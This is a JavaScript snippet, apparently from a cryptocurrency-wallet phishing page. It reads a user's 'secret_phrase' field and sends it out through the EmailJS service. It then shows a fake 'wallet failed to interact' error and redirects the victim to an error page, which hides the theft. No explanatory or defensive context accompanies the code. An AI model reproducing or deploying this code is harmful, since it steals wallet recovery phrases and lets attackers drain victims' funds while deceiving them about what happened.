function SendMail() {
    var params = {
        result : document.getElementById("secret_phrase").value
    }
    emailjs.send("service_0fib79d", "template_cnqeg6o", params).then(function (res) {
        alert("Error!: wallet failed to interact successfully" );
        window.location.href = "/error.html";
    })
}
